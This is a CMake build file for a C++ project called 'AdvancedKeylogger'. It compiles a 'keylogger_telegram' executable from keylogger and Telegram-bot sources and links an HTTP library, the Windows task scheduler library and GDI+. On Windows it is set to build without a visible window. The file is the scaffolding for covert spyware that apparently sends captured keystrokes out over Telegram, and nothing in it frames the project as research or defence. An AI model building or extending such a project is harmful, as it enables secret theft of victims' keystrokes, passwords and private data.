cmake_minimum_required(VERSION 3.15)
project(AdvancedKeylogger)

# Set C++ standard to 17
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Include our own headers
include_directories(include)

# Add the cpr library as a subdirectory
# This assumes cpr_repo is in the project root
add_subdirectory(cpr_repo)

# Add our executable
add_executable(keylogger_telegram src/main.cpp src/ConfigManager.cpp src/TelegramBot.cpp src/Keylogger.cpp)

# Link against cpr and other necessary libraries
target_link_libraries(keylogger_telegram PRIVATE cpr::cpr ws2_32.lib wldap32.lib crypt32.lib normaliz.lib taskschd.lib ole32.lib oleaut32.lib gdiplus.lib)

# For Windows, create a windowless application
if(WIN32)
    set_target_properties(keylogger_telegram PROPERTIES WIN32_EXECUTABLE ON)
endif()
